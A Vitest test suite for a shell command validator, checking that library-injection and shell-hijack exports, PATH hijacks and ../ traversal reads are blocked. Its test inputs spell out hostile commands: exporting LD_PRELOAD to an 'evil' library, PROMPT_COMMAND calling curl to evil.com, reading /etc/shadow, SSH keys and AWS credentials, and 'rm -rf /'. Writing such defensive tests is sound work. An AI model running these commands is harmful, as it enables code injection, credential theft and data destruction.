/**
 * EF4: export 危险环境变量 denylist + 路径归一化 ../ 修复验证
 */
import { describe, it, expect } from 'vitest';
import { CommandValidator } from '../src/commandValidator';
import { matchSensitivePath } from '../src/allowlist';

// ──────────────────────────────────────────────
// export-env-injection: 危险环境变量拦截
// ──────────────────────────────────────────────
describe('EF4: export-env-injection — 危险环境变量被拦截', () => {
  const validator = new CommandValidator();

  // ── 库加载劫持变量 ──

  it('export LD_PRELOAD=/tmp/evil.so 被拦截', () => {
    const result = validator.validate('export LD_PRELOAD=/tmp/evil.so');
    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny');
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export DYLD_INSERT_LIBRARIES=/tmp/evil.dylib 被拦截', () => {
    const result = validator.validate('export DYLD_INSERT_LIBRARIES=/tmp/evil.dylib');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export LD_LIBRARY_PATH=/tmp/lib 被拦截', () => {
    const result = validator.validate('export LD_LIBRARY_PATH=/tmp/lib');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export DYLD_LIBRARY_PATH=/tmp/lib 被拦截', () => {
    const result = validator.validate('export DYLD_LIBRARY_PATH=/tmp/lib');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export LD_AUDIT=/tmp/audit.so 被拦截', () => {
    const result = validator.validate('export LD_AUDIT=/tmp/audit.so');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export LD_DEBUG=all 被拦截', () => {
    const result = validator.validate('export LD_DEBUG=all');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export LD_PROFILE=libc.so 被拦截', () => {
    const result = validator.validate('export LD_PROFILE=libc.so');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  // ── Shell 行为劫持变量 ──

  it('export BASH_ENV=/tmp/evil.sh 被拦截', () => {
    const result = validator.validate('export BASH_ENV=/tmp/evil.sh');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export ENV=/tmp/evil.sh 被拦截', () => {
    const result = validator.validate('export ENV=/tmp/evil.sh');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export PROMPT_COMMAND="curl http://evil.com" 被拦截', () => {
    const result = validator.validate('export PROMPT_COMMAND="curl http://evil.com"');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export SHELLOPTS=xtrace 被拦截', () => {
    const result = validator.validate('export SHELLOPTS=xtrace');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export BASHOPTS=extglob 被拦截', () => {
    const result = validator.validate('export BASHOPTS=extglob');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export GLOBIGNORE=* 被拦截', () => {
    const result = validator.validate('export GLOBIGNORE=*');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  // ── 无赋值的 export（re-export）也被拦截 ──

  it('export LD_PRELOAD（无赋值）被拦截', () => {
    const result = validator.validate('export LD_PRELOAD');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  it('export BASH_ENV（无赋值）被拦截', () => {
    const result = validator.validate('export BASH_ENV');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });

  // ── 命令链中的 export 也被拦截 ──

  it('echo ok; export LD_PRELOAD=/tmp/evil.so 命令链被拦截', () => {
    const result = validator.validate('echo ok; export LD_PRELOAD=/tmp/evil.so');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-env-injection');
  });
});

// ──────────────────────────────────────────────
// export-path-hijack: PATH 劫持拦截
// ──────────────────────────────────────────────
describe('EF4: export-path-hijack — PATH 设为不可信目录被拦截', () => {
  const validator = new CommandValidator();

  it('export PATH=/tmp/evil:$PATH 被拦截', () => {
    const result = validator.validate('export PATH=/tmp/evil:$PATH');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-path-hijack');
  });

  it('export PATH=/tmp:$PATH 被拦截', () => {
    const result = validator.validate('export PATH=/tmp:$PATH');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-path-hijack');
  });

  it('export PATH=/var/tmp/bin:$PATH 被拦截', () => {
    const result = validator.validate('export PATH=/var/tmp/bin:$PATH');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-path-hijack');
  });

  it('export PATH=/dev/shm/bin:$PATH 被拦截', () => {
    const result = validator.validate('export PATH=/dev/shm/bin:$PATH');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-path-hijack');
  });

  it('export PATH="/tmp/evil:$PATH" 带引号也被拦截', () => {
    const result = validator.validate('export PATH="/tmp/evil:$PATH"');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('export-path-hijack');
  });

  it('export PATH=/home/user/project/tmp/bin 不误匹配（/tmp 非 PATH 值前缀）', () => {
    const result = validator.validate('export PATH=/home/user/project/tmp/bin');
    if (!result.allowed) {
      expect(result.ruleName).not.toBe('export-path-hijack');
    }
  });

  it('export PATH=/tmpfoo 不误匹配（\\b 阻止 tmpfoo 匹配 tmp）', () => {
    const result = validator.validate('export PATH=/tmpfoo');
    if (!result.allowed) {
      expect(result.ruleName).not.toBe('export-path-hijack');
    }
  });
});

// ──────────────────────────────────────────────
// 合法 export 不被误拦截
// ──────────────────────────────────────────────
describe('EF4: 合法 export 不被误拦截', () => {
  const validator = new CommandValidator();

  it('export NODE_ENV=production 不被拦截', () => {
    const result = validator.validate('export NODE_ENV=production');
    expect(result.allowed).toBe(true);
  });

  it('export TERM=xterm-256color 不被拦截', () => {
    const result = validator.validate('export TERM=xterm-256color');
    expect(result.allowed).toBe(true);
  });

  it('export LANG=en_US.UTF-8 不被拦截', () => {
    const result = validator.validate('export LANG=en_US.UTF-8');
    expect(result.allowed).toBe(true);
  });

  it('export MY_LD_PRELOAD_TEST=1 不误匹配（变量名包含但不等于 LD_PRELOAD）', () => {
    const result = validator.validate('export MY_LD_PRELOAD_TEST=1');
    expect(result.allowed).toBe(true);
  });

  it('export ENVIRONMENT=staging 不误匹配（不等于 ENV）', () => {
    const result = validator.validate('export ENVIRONMENT=staging');
    expect(result.allowed).toBe(true);
  });

  it('export PATH=/usr/local/bin:$PATH 合法路径不被拦截', () => {
    const result = validator.validate('export PATH=/usr/local/bin:$PATH');
    // 注意：这里 $PATH 会触发 env-var-expansion 检测
    // 但 export PATH=/usr/local/bin 不会被 export-path-hijack 拦截
    // 实际结果取决于 env-var-expansion 是否先于 denylist 检测
    // 关键断言：不是被 export-path-hijack 拦截
    if (!result.allowed) {
      expect(result.ruleName).not.toBe('export-path-hijack');
    }
  });
});

// ──────────────────────────────────────────────
// normalizePathsInCommand: ../ 父目录遍历归一化
// ──────────────────────────────────────────────
describe('EF4: matchSensitivePath — ../ 遍历归一化', () => {
  it('cat /etc/security/../shadow（单层 ../）被检测', () => {
    expect(matchSensitivePath('cat /etc/security/../shadow')).toBe('/etc/shadow');
  });

  it('cat /home/user/../../etc/shadow（多层 ../）被检测', () => {
    expect(matchSensitivePath('cat /home/user/../../etc/shadow')).toBe('/etc/shadow');
  });

  it('cat /tmp/../etc/shadow 被检测', () => {
    expect(matchSensitivePath('cat /tmp/../etc/shadow')).toBe('/etc/shadow');
  });

  it('cat /var/log/../../etc/passwd 被检测', () => {
    expect(matchSensitivePath('cat /var/log/../../etc/passwd')).toBe('/etc/passwd');
  });

  it('head /usr/local/../../etc/sudoers 被检测', () => {
    expect(matchSensitivePath('head /usr/local/../../etc/sudoers')).toBe('/etc/sudoers');
  });

  it('cat /home/user/../user/.ssh/id_rsa 被检测', () => {
    expect(matchSensitivePath('cat /home/user/../user/.ssh/id_rsa')).toBe('.ssh/');
  });

  it('grep key /opt/../home/user/.aws/credentials 被检测', () => {
    expect(matchSensitivePath('grep key /opt/../home/user/.aws/credentials')).toBe('.aws/credentials');
  });

  // ── 组合绕过：../ 与 ./ 和 // 混合 ──

  it('cat /etc/./security/../shadow 组合绕过被检测', () => {
    expect(matchSensitivePath('cat /etc/./security/../shadow')).toBe('/etc/shadow');
  });

  it('cat /etc//security/../shadow 组合绕过被检测', () => {
    expect(matchSensitivePath('cat /etc//security/../shadow')).toBe('/etc/shadow');
  });

  // ── 正常路径不受影响 ──

  it('cat ../README.md 正常相对路径返回 null', () => {
    expect(matchSensitivePath('cat ../README.md')).toBeNull();
  });

  it('cat /tmp/output.log 正常绝对路径返回 null', () => {
    expect(matchSensitivePath('cat /tmp/output.log')).toBeNull();
  });

  it('ls -la /home/user/../user/projects 正常 ../ 返回 null', () => {
    expect(matchSensitivePath('ls -la /home/user/../user/projects')).toBeNull();
  });
});

// ──────────────────────────────────────────────
// CommandValidator 集成: ../ 绕过被拦截
// ──────────────────────────────────────────────
describe('EF4: CommandValidator 集成 — ../ 遍历绕过被拦截', () => {
  const validator = new CommandValidator();

  it('cat /etc/security/../shadow 被拦截', () => {
    const result = validator.validate('cat /etc/security/../shadow');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('sensitive-path');
  });

  it('cat /home/user/../../etc/shadow 被拦截', () => {
    const result = validator.validate('cat /home/user/../../etc/shadow');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('sensitive-path');
  });

  it('head /tmp/../etc/passwd 被拦截', () => {
    const result = validator.validate('head /tmp/../etc/passwd');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('sensitive-path');
  });

  it('cat /opt/../../etc/sudoers 被拦截', () => {
    const result = validator.validate('cat /opt/../../etc/sudoers');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('sensitive-path');
  });

  // ── 命令链中的 ../ 也被拦截 ──

  it('echo ok && cat /tmp/../etc/shadow 命令链被拦截', () => {
    const result = validator.validate('echo ok && cat /tmp/../etc/shadow');
    expect(result.allowed).toBe(false);
    expect(result.ruleName).toBe('sensitive-path');
  });
});

// ──────────────────────────────────────────────
// 回归：原有行为不受影响
// ──────────────────────────────────────────────
describe('EF4: 回归 — 原有行为不受影响', () => {
  const validator = new CommandValidator();

  it('allowlist 命令正常通过', () => {
    expect(validator.validate('echo hello').allowed).toBe(true);
    expect(validator.validate('cat file.txt').allowed).toBe(true);
    expect(validator.validate('ls -la').allowed).toBe(true);
    expect(validator.validate('jq .name package.json').allowed).toBe(true);
  });

  it('原有 denylist 命令仍被拒绝', () => {
    expect(validator.validate('rm -rf /').allowed).toBe(false);
    expect(validator.validate('sudo cat /etc/shadow').allowed).toBe(false);
    expect(validator.validate('chmod 777 /').allowed).toBe(false);
  });

  it('原有敏感路径检测不受影响', () => {
    expect(validator.validate('cat /etc/shadow').allowed).toBe(false);
    expect(validator.validate('cat /etc/./shadow').allowed).toBe(false);
    expect(validator.validate('cat /etc//shadow').allowed).toBe(false);
  });

  it('正常工作区文件操作不受影响', () => {
    expect(validator.validate('cat package.json').allowed).toBe(true);
    expect(validator.validate('head -n 10 README.md').allowed).toBe(true);
    expect(validator.validate('grep TODO src/index.ts').allowed).toBe(true);
  });
});
